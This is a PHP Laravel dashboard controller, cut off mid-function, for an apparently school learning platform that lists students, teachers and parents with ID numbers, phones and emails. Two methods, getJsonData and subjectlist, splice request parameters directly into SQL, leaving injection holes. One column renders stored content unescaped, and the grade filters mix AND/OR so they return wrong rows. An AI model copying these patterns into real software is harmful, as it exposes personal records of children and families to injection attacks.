<?php

namespace App\Http\Controllers;

use App\Models\Chapter;
use App\Models\Content;
use App\Models\Grade;
use App\Models\Subject;
use App\Models\CourseContent;
use Illuminate\Http\Request;
use App\Http\Requests\StoreChapterRequest;
use App\Http\Requests\UpdateChapterRequest;
use Illuminate\Support\Facades\DB;
use DataTables;
class DashboardController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        $student = DB::select('select count(id) as student_count from students');
        $teacher = DB::select('select count(id) as teacher_count from teachers');
        $parent = DB::select('select count(id) as parent_count from student_parents');
        
        $student_count = $student && isset($student[0]->student_count) ? $student[0]->student_count : 0;
        $teacher_count = $teacher && isset($teacher[0]->teacher_count) ? $teacher[0]->teacher_count : 0;
        $parent_count = $parent && isset($parent[0]->parent_count) ? $parent[0]->parent_count : 0;


        $grade1 = DB::select('select count(s.id) as grade1_count from students as s
            join grades as g
                on g.id = s.grade_id
            where g.name like \'%Grade 1%\' or g.name like \'%Grade1%\'');
        $grade2 = DB::select('select count(s.id) as grade2_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 2%\' or g.name like \'%Grade2%\'');
        $grade3 = DB::select('select count(s.id) as grade3_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 3%\' or g.name like \'%Grade3%\'');
        $grade4 = DB::select('select count(s.id) as grade4_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 4%\' or g.name like \'%Grade4%\'');
        
        $grade5 = DB::select('select count(s.id) as grade5_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 5%\' or g.name like \'%Grade5%\'');
        $grade6 = DB::select('select count(s.id) as grade6_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 6%\' or g.name like \'%Grade6%\'');
        $grade7 = DB::select('select count(s.id) as grade7_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 7%\' or g.name like \'%Grade7%\'');
        $grade8 = DB::select('select count(s.id) as grade8_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 8%\' or g.name like \'%Grade8%\'');
        $grade9 = DB::select('select count(s.id) as grade9_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 9%\' or g.name like \'%Grade9%\'');
        $grade10 = DB::select('select count(s.id) as grade10_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 10%\' or g.name like \'%Grade10%\'');
        $grade11 = DB::select('select count(s.id) as grade11_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 11%\' or g.name like \'%Grade11%\'');
        $grade12 = DB::select('select count(s.id) as grade12_count from students as s
        join grades as g
            on g.id = s.grade_id
        where g.name like \'%Grade 12%\' or g.name like \'%Grade12%\'');
        $grade1_count = $grade1 && isset($grade1[0]->grade1_count) ? $grade1[0]->grade1_count : 0;
        $grade2_count = $grade2 && isset($grade2[0]->grade2_count) ? $grade2[0]->grade2_count : 0;
        $grade3_count = $grade3 && isset($grade3[0]->grade3_count) ? $grade3[0]->grade3_count : 0;
        $grade4_count = $grade4 && isset($grade4[0]->grade4_count) ? $grade4[0]->grade4_count : 0;
        $grade5_count = $grade5 && isset($grade5[0]->grade5_count) ? $grade5[0]->grade5_count : 0;
        $grade6_count = $grade6 && isset($grade6[0]->grade6_count) ? $grade6[0]->grade6_count : 0;
        $grade7_count = $grade7 && isset($grade7[0]->grade7_count) ? $grade7[0]->grade7_count : 0;
        $grade8_count = $grade8 && isset($grade8[0]->grade8_count) ? $grade8[0]->grade8_count : 0;
        $grade9_count = $grade9 && isset($grade9[0]->grade9_count) ? $grade9[0]->grade9_count : 0;
        $grade10_count = $grade10 && isset($grade10[0]->grade10_count) ? $grade10[0]->grade10_count : 0;
        $grade11_count = $grade11 && isset($grade11[0]->grade11_count) ? $grade11[0]->grade11_count : 0;
        $grade12_count = $grade12 && isset($grade12[0]->grade12_count) ? $grade12[0]->grade12_count : 0;


        $totalUsers = DB::table('users')->where('role', '!=', 'admin')->count();
        $syncUsers = DB::table('users')
            ->where('role', '!=', 'admin')
            ->where('sync_datetime', '!=', NULL)
            ->count();
        $unSyncUsers = DB::table('users')
            ->where('role', '!=', 'admin')
            ->where('sync_datetime', NULL)
            ->count();
            $lessons = DB::table('chapters')->count();
            $courses = DB::table('courses')->count();
            $libraryDocumentContents = DB::table('library_document_contents')->count();
            $libraryAudioContents = DB::table('library_audio_contents')->count();
            $libraryVideoContents = DB::table('library_video_contents')->count();
            $libraryKitContents = DB::table('library_kit_contents')->count();

            $libraries = $libraryDocumentContents + $libraryAudioContents +  $libraryVideoContents +  $libraryKitContents;



        if ($totalUsers > 0) {
            $studentPercentage = intval(($student_count / $totalUsers) * 100);
        } else {
            $studentPercentage = 0;
        }

        if ($totalUsers > 0) {
            $teacherPercentage = intval(($teacher_count / $totalUsers) * 100);
        } else {
            $teacherPercentage = 0;
        }

        if ($totalUsers > 0) {
            $parentPercentage = intval(($parent_count / $totalUsers) * 100);
        } else {
            $parentPercentage = 0;
        }

        if ($totalUsers > 0) {
            $syncUserPercentage = intval(($syncUsers / $totalUsers) * 100);
        } else {
            $syncUserPercentage = 0;
        }

        if ($totalUsers > 0) {
            $unSyncUserPercentage = intval(($unSyncUsers / $totalUsers) * 100);
        } else {
            $unSyncUserPercentage = 0;
        }

        if ($totalUsers > 0) {
            $totalUsersPercentage = intval(($totalUsers / $totalUsers) * 100);
        } else {
            $totalUsersPercentage = 0;
        }

    $data = DB::select('
        SELECT
            MONTHNAME(created_at) AS month,
            SUM(CASE WHEN role = \'student\' THEN 1 ELSE 0 END) AS student_count,
            SUM(CASE WHEN role = \'teacher\' THEN 1 ELSE 0 END) AS teacher_count,
            SUM(CASE WHEN role = \'parent\' THEN 1 ELSE 0 END) AS parent_count
        FROM
        users
        GROUP BY
        MONTH(created_at)
        ');

        $chartData = [];
        foreach ($data as $row) {
            $chartData[] = [
                'month' => $row->month,
                'student_count' => $row->student_count,
                'teacher_count' => $row->teacher_count,
                'parent_count' => $row->parent_count,
            ];
        }
        $grades = Grade::get();
        $gradeId = '';
        if (!empty($grades)) {
            $gradeId = isset($grades[0]->id) ? $grades[0]->id : 0;
        } else {
            $gradeId = 0;
        }
        $subject_statistics = DB::select('
        select 
    (select count(sl.id) from subject_lessons as sl
    join chapters as ch
    on ch.id = sl.chapter_id
    where ch.subject_id = s.id
    and sl.type = \'video\') as video_count,
       (select count(sl.id) from subject_lessons as sl
    join chapters as ch
    on ch.id = sl.chapter_id
    where ch.subject_id = s.id
    and sl.type = \'file\') as doc_count,
       (select count(sl.id) from subject_lessons as sl
    join chapters as ch
    on ch.id = sl.chapter_id
    where ch.subject_id = s.id
    and sl.type = \'audio\') as audio_count,
    s.name as subject_name,
    s.id as subject_id,
    s.icon as subject_icon
    from subjects as s
    join subjects_in_grades as sig
    on s.id = sig.subject_id
    join grades as g
    on g.id = sig.grade_id
    where g.id = '.$gradeId);
    $courses_statistics = DB::select('
    select 
(select count(cc.id) from course_contents as cc
where cc.course_id = c.id
and cc.type = \'video\') as video_count,
(select count(cc.id) from course_contents as cc
where cc.course_id = c.id
and cc.type = \'file\') as doc_count,
(select count(cc.id) from course_contents as cc
where cc.course_id = c.id
and cc.type = \'audio\') as audio_count,
c.name as course_name,
c.id as course_id,
c.icon as course_icon
from courses as c');

    $library_videos = DB::select('
    select 
                lv.description,
                lv.id as video_id,
            (select count(lvc.id) from library_video_contents as lvc
            where lvc.library_video_id  = lv.id) as library_video_count
            from library_videos as lv 
    ');
    $library_audios = DB::select('
    select 
                la.description,
                la.id as audio_id,
            (select count(lac.id) from library_audio_contents as lac
            where lac.library_audio_id  = la.id) as library_audio_count
            from library_audios as la 
    ');
    $library_documents = DB::select('
    select 
                ld.description,
                ld.id as document_id,
            (select count(ldc.id) from library_document_contents as ldc
            where ldc.library_document_id  = ld.id) as library_document_count
            from library_documents as ld 
    ');
    $library_kits = DB::select('
    select 
                lk.name,
                lk.id as kit_id,
            (select count(lkc.id) from library_kit_contents as lkc
            where lkc.library_kit_id  = lk.id) as library_kit_count
            from library_kits as lk 
    ');
    
            // $library_statistics = DB::select('
            // SELECT description AS lv_des, NULL AS la_des, NULL AS ld_des
            // FROM library_videos
            // UNION ALL
            // SELECT NULL AS lv_des, description AS la_des, NULL AS ld_des
            // FROM library_audios
            // UNION ALL
            // SELECT NULL AS lv_des, NULL AS la_des, description AS ld_des
            // FROM library_documents;
            // ');
        
            $grade_statisticts = DB::select('select 
            distinct g.name as grade_name, g.id as grade_id,
             (select count(stu.id) from students as stu
                    where stu.grade_id = g.id
                    and stu.gender = \'male\') as male_student_count,
                    (select count(stu.id) from students as stu
                    where stu.grade_id = g.id
                    and stu.gender = \'female\') as female_student_count,
                    (select count(sl.id) from subject_lessons as sl
                    join chapters as ch
                    on ch.id = sl.chapter_id
                    where ch.grade_id = g.id
                    and sl.type = \'video\') as video_count,
                       (select count(sl.id) from subject_lessons as sl
                    join chapters as ch
                    on ch.id = sl.chapter_id
                    where ch.grade_id = g.id
                    and sl.type = \'file\') as doc_count,
                       (select count(sl.id) from subject_lessons as sl
                    join chapters as ch
                    on ch.id = sl.chapter_id
                    where ch.grade_id = g.id
                    and sl.type = \'audio\') as audio_count
                    from grades as g
                    left join subjects_in_grades as sig
                    on g.id = sig.subject_id
                    left join subjects as s
                    on s.id = sig.subject_id
            ');
            $provincial_user_statistics = DB::select('
            SELECT
            COALESCE(male_students.male_student_count, 0) AS male_student_count,
            COALESCE(female_students.female_student_count, 0) AS female_student_count,
            COALESCE(teacher_male_students.male_teacher_count, 0) AS male_teacher_count,
            COALESCE(teacher_female_students.female_teacher_count, 0) AS female_teacher_count,
            COALESCE(parent_male_students.male_parent_count, 0) AS male_parent_count,
            COALESCE(parent_female_students.female_parent_count, 0) AS female_parent_count,
    p.name AS province_name,
    p.id as province_id
FROM
    provinces AS p
LEFT JOIN
    (
        SELECT
            s.province_id,
            COUNT(s.id) AS male_student_count
        FROM
            students AS s
        WHERE
            s.gender = \'male\'
        GROUP BY
            s.province_id
    ) AS male_students ON male_students.province_id = p.id
LEFT JOIN
    (
        SELECT
            s.province_id,
            COUNT(s.id) AS female_student_count
        FROM
            students AS s
        WHERE
            s.gender = \'female\'
        GROUP BY
            s.province_id
    ) AS female_students ON female_students.province_id = p.id
    LEFT JOIN
    (
        SELECT
            t.province_id,
            COUNT(t.id) AS male_teacher_count
        FROM
            teachers AS t
        WHERE
            t.gender = \'male\'
        GROUP BY
            t.province_id
    ) AS teacher_male_students ON teacher_male_students.province_id = p.id
    LEFT JOIN
    (
        SELECT
            t.province_id,
            COUNT(t.id) AS female_teacher_count
        FROM
            teachers AS t
        WHERE
            t.gender = \'female\'
        GROUP BY
            t.province_id
    ) AS teacher_female_students ON teacher_female_students.province_id = p.id
    LEFT JOIN
    (
        SELECT
            sp.province_id,
            COUNT(sp.id) AS male_parent_count
        FROM
            student_parents AS sp
        WHERE
            sp.gender = \'male\'
        GROUP BY
            sp.province_id
    ) AS parent_male_students ON parent_male_students.province_id = p.id
    LEFT JOIN
    (
        SELECT
            sp.province_id,
            COUNT(sp.id) AS female_parent_count
        FROM
            student_parents AS sp
        WHERE
            sp.gender = \'female\'
        GROUP BY
            sp.province_id
    ) AS parent_female_students ON parent_female_students.province_id = p.id;
            ');
                    return view('pages.dashboard.index', compact('student_count', 'teacher_count', 'parent_count',
                     'studentPercentage', 'teacherPercentage','parentPercentage', 'totalUsers', 
                     'chartData', 'syncUsers', 'unSyncUsers', 'lessons', 'courses', 'libraries',
                    'grade1_count', 'grade2_count', 'grade3_count', 'grade4_count', 'grade5_count', 'grade6_count',
                    'grade7_count', 'grade8_count', 'grade9_count', 'grade10_count', 'grade11_count', 'grade12_count', 'grades', 
                    'subject_statistics', 'library_videos', 'library_audios', 'library_documents', 'library_kits', 
                    'courses_statistics', 'grade_statisticts', 'provincial_user_statistics', 'syncUserPercentage',
                'unSyncUserPercentage', 'totalUsersPercentage'));
                }




    public function studentIndex()
    {
        return view('pages.dashboard.student_index');
    }

    public function teacherIndex()
    {
        return view('pages.dashboard.teacher_index');
    }

    public function parentIndex()
    {
        return view('pages.dashboard.parent_index');
    }
    public function list(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                    SELECT
                        u.id,
                        u.name as full_name,
                        u.identity_number as indentification_number,
                        sch.name as school_name,
                        g.name as grade_name,
                        s.phone_no as phone_number,
                        u.last_seen,
                        u.updated_at
                from users as u
                left join students as s
                    on u.id = s.user_id
                left join schools as sch
                    on sch.id = s.school_id
                left join grades as g
                    on g.id = s.grade_id
                where u.role = \'student\'
            ');
            return Datatables::of($data)
                ->addIndexColumn()
                ->addColumn('actions', function ($row) {
                    $actionBtn = '<a  href="/profile/'.$row->id.'">profile</a>';
                    return $actionBtn;
                })
                ->rawColumns(['actions'])
                ->make(true);

        }
    }

    public function studentList(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                    SELECT
                        u.id,
                        u.name as full_name,
                        u.identity_number as indentification_number,
                        sch.name as school_name,
                        g.name as grade_name,
                        s.phone_no as phone_number,
                        u.last_seen,
                        u.email,
                        p.name as province_name,
                        s.gender,
                        u.updated_at
                from users as u
                left join students as s
                    on u.id = s.user_id
                left join schools as sch
                    on sch.id = s.school_id
                left join grades as g
                    on g.id = s.grade_id
                left join provinces as p
                    on p.id = s.province_id    
                where u.role = \'student\'
            ');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);

        }
    }

    public function teacherList(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                    SELECT
                    u.id,
                    u.name as full_name,
                    u.identity_number as indentification_number,
                    sch.name as school_name,
                    g.name as grade_name,
                    t.phone_no as phone_number,
                    u.last_seen,
                    u.email,
                    p.name as province_name,
                    t.gender,
                    u.updated_at
            from users as u
            left join teachers as t
                on u.id = t.user_id
            left join schools as sch
                on sch.id = t.school_id
            left join grades as g
                on g.id = t.grade_id
            left join provinces as p
                on p.id = t.province_id    
            where u.role = \'teacher\'
            ');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);

        }
    }

    public function parentList(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                    SELECT
                    u.id,
                    u.name as full_name,
                    u.identity_number as indentification_number,
                    sch.name as school_name,
                    g.name as grade_name,
                    sl.phone_no as phone_number,
                    u.last_seen,
                    u.email,
                    p.name as province_name,
                    sl.gender,
                    u.updated_at
            from users as u
            left join student_parents as sl
                on u.id = sl.user_id
            left join schools as sch
                on sch.id = sl.school_id
            left join grades as g
                on g.id = sl.grade_id
            left join provinces as p
                on p.id = sl.province_id    
            where u.role = \'parent\'
                    ');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);

        }
    }

    public function grade1Index()
    {
        return view('pages.dashboard.grades.grade1_index');
    }

    public function grade1List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 1%\' or g.name like \'%Grade1%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);

        }
        
    }

    public function grade2Index()
    {
        return view('pages.dashboard.grades.grade2_index');
    }

    public function grade2List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 2%\' or g.name like \'%Grade2%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade3Index()
    {
        return view('pages.dashboard.grades.grade3_index');
    }

    public function grade3List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 3%\' or g.name like \'%Grade3%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade4Index()
    {
        return view('pages.dashboard.grades.grade4_index');
    }

    public function grade4List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 4%\' or g.name like \'%Grade4%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade5Index()
    {
        return view('pages.dashboard.grades.grade5_index');
    }

    public function grade5List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 5%\' or g.name like \'%Grade5%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade6Index()
    {
        return view('pages.dashboard.grades.grade6_index');
    }

    public function grade6List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 6%\' or g.name like \'%Grade6%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade7Index()
    {
        return view('pages.dashboard.grades.grade7_index');
    }

    public function grade7List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 7%\' or g.name like \'%Grade7%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade8Index()
    {
        return view('pages.dashboard.grades.grade8_index');
    }

    public function grade8List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 8%\' or g.name like \'%Grade8%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade9Index()
    {
        return view('pages.dashboard.grades.grade9_index');
    }

    public function grade9List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 9%\' or g.name like \'%Grade9%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade10Index()
    {
        return view('pages.dashboard.grades.grade10_index');
    }

    public function grade10List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 10%\' or g.name like \'%Grade10%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade11Index()
    {
        return view('pages.dashboard.grades.grade11_index');
    }

    public function grade11List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 11%\' or g.name like \'%Grade11%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function grade12Index()
    {
        return view('pages.dashboard.grades.grade12_index');
    }

    public function grade12List(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.name like \'%Grade 12%\' or g.name like \'%Grade12%\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function syncUsers()
    {
        return view('pages.dashboard.users.sync_user_index');
    }

    public function syncUserList(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                u.sync_datetime,
                u.last_seen,
                u.email,
                u.role,
                u.updated_at
        from users as u
        where u.sync_datetime is not NULL
        and u.role != \'admin\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function unSyncUsers()
    {
        return view('pages.dashboard.users.unsync_user_index');
    }

    public function unSyncUserList(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                u.sync_datetime,
                u.last_seen,
                u.email,
                u.role,
                u.updated_at
        from users as u
        where u.sync_datetime is NULL
        and u.role != \'admin\'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }
    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Display the specified resource.
     */
    public function show(Request $request)
    {
        if ($request->ajax()) {
            $chapter = Chapter::find($request->id);
    
            if ($chapter) {
                $chapter->chapter_status = $chapter->status ? 'Active' : 'Inactive';
                $chapter->grade_name = $chapter->grades->name;
                $chapter->subject_name = $chapter->subjects->name;
    
                // Load the related contents for the chapter
                $chapter->loadContents();
    
                return response()->json($chapter);
            }
        }
    
        return response()->json(['data' => null], 404);
    }


public function getJsonData(Request $request){
        $data = [];
if($request->ajax()){
 $where = ($request->subject_statistics != 'all') ? 'where g.id = '.$request->subject_statistics : '';
    $subject_statistics = DB::select('
    select 
    (select count(sl.id) from subject_lessons as sl
    join chapters as ch
    on ch.id = sl.chapter_id
    where ch.subject_id = s.id
    and sl.type = \'video\') as video_count,
       (select count(sl.id) from subject_lessons as sl
    join chapters as ch
    on ch.id = sl.chapter_id
    where ch.subject_id = s.id
    and sl.type = \'file\') as doc_count,
       (select count(sl.id) from subject_lessons as sl
    join chapters as ch
    on ch.id = sl.chapter_id
    where ch.subject_id = s.id
    and sl.type = \'audio\') as audio_count,
    s.name as subject_name,
    s.id as subject_id,
    s.icon as subject_icon
    from subjects as s
    join subjects_in_grades as sig
    on s.id = sig.subject_id
    join grades as g
    on g.id = sig.grade_id '. $where );

$data['subject_statistics'] = $subject_statistics;
    return response()->json($data);
}
else{
    \Log::info('not ajax');
}
    }
   

    public function getLibraryJsonData(Request $request) {
        $data = [];
    
        if ($request->ajax()) {
            $library_videos = DB::select('
                select 
                    lv.description,
                    (select count(lvc.id) from library_video_contents as lvc where lvc.library_video_id = lv.id) as library_video_count
                from library_videos as lv
            ');
    
            $library_audios = DB::select('
                select 
                    la.description,
                    (select count(lac.id) from library_audio_contents as lac where lac.library_audio_id = la.id) as library_audio_count
                from library_audios as la
            ');
    
            $library_documents = DB::select('
                select 
                    ld.description,
                    (select count(ldc.id) from library_document_contents as ldc where ldc.library_document_id = ld.id) as library_document_count
                from library_documents as ld
            ');
    
            $library_kits = DB::select('
                select 
                    lk.name,
                    (select count(lkc.id) from library_kit_contents as lkc where lkc.library_kit_id = lk.id) as library_kit_count
                from library_kits as lk
            ');
    
            if ($request->library_statistics === 'video') {
                $data['library_videos'] = $library_videos;
            } elseif ($request->library_statistics === 'audio') {
                $data['library_audios'] = $library_audios;
            } elseif ($request->library_statistics === 'document') {
                $data['library_documents'] = $library_documents;
            } elseif ($request->library_statistics === 'iqra-kit') {
                $data['library_kits'] = $library_kits;
            } else {
                $data['library_videos'] = $library_videos;
                $data['library_audios'] = $library_audios;
                $data['library_documents'] = $library_documents;
                $data['library_kits'] = $library_kits;
            }
      
    
        return response()->json($data);
    }
else{
    \Log::info('not ajax');
}
}

    public function subjectIndex(Request $request)
    {

        $grades = Grade::where('status', '1')->get();
        $subjects = Subject::where('status', '1')->get();
        $subject_id = $request->subject_id;
        return view('pages.dashboard.subject.index', compact('subject_id', 'grades'));
    }

    public function subjectlist(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
            SELECT
                c.id,
                c.number,
                c.updated_at,
                c.name,
                c.status,
                c.total_quiz_time,
                g.name AS grade_name,
                g.id AS grade_id,
                s.name AS subject_name,
                s.id AS subject_id,
                MAX(q.id) AS quiz_included,
                GROUP_CONCAT(DISTINCT sl.type SEPARATOR ", ") AS lesson_types
            FROM chapters AS c
            JOIN grades AS g ON g.id = c.grade_id
            JOIN subjects AS s ON s.id = c.subject_id
            LEFT JOIN subject_lessons AS sl ON c.id = sl.chapter_id
            LEFT JOIN quizes AS q ON c.id = q.chapter_id
            where c.subject_id = '.$request->subject_id.'
            GROUP BY c.id
            ORDER BY c.updated_at DESC
            ');
            return Datatables::of($data)
                ->addIndexColumn()
                ->addColumn('chapter_status', function ($row) {
                    return $row->status ? 'Active' : 'Inactive';
                })
                ->addColumn('lesson_types', function ($row) {
                    return $row->lesson_types ?? 'N/A';
                })
                ->addColumn('quiz_included', function ($row) {
                    return $row->quiz_included ? 'Yes' : 'No';
                })
                ->addColumn('actions', function ($row) {
                    $actionBtn = '<a onclick="loadRecord('.$row->id.')" href="javascript:void(0)" 
                    data-toggle="modal" data-target="#modal-view"><i class="material-icons"; style="color:SlateBlue">visibility</i></a>';
                    return $actionBtn;
                })
                ->rawColumns(['actions'])
                ->make(true);

        }
    }

    public function courseIndex(Request $request)
    {
        $course_id = $request->course_id;
        return view('pages.dashboard.course.index', compact('course_id'));
    }

    public function courselist(Request $request){
            if ($request->ajax()) {
    
                $data = CourseContent::where('course_id', $request->course_id)->latest()->get();           
              
            return Datatables::of($data)
            ->addIndexColumn()
            ->addColumn('Contents', function ($row) {
                if($row->type == 'file'){
                    $contentBody = '<a href="'.asset($row->body).'" target="_blank">Download Content</a>'; 
                    return $contentBody;
                }elseif($row->type == 'video'){
                   $contentBody = '<a href="'.asset($row->body).'" target="_blank">Download Content
                   </a>';
                   return $contentBody;
                }else{
                    return $row->body;
                }
              
            })
            ->rawColumns(['Contents'])
            ->make(true);
        }
    }

    public function gradeIndex(Request $request)
    {
        $grade_id = $request->grade_id;
        return view('pages.dashboard.grades.student_index', compact('grade_id'));
    }

    public function gradeList(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
